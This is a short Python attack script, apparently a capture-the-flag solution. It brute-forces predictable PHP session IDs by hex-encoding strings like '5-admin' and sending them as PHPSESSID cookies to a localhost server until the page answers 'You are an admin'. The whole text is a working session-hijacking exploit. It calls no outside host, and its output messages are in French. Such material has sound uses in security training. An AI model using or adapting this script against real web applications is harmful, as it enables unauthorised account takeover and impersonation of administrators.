import requests
from requests.auth import HTTPBasicAuth

url='http://localhost/'
auth=HTTPBasicAuth('username','password')
portion = "2d61646d696e"
for id in range(1,640):
    session_string = f"{id}-admin"
    session_id_hex = session_string.encode('utf-8').hex()
    cookies={'PHPSESSID': session_id_hex}
    data={'username': 'admin','password': 'pass'}
    try:
        response = requests.post(url, auth=auth, cookies=cookies, data=data)
    except:
        pass

    if "You are an admin" in response.text:
        print(f"[+] L'id admin est {id}")
        print("")
        print(response.text)
        break


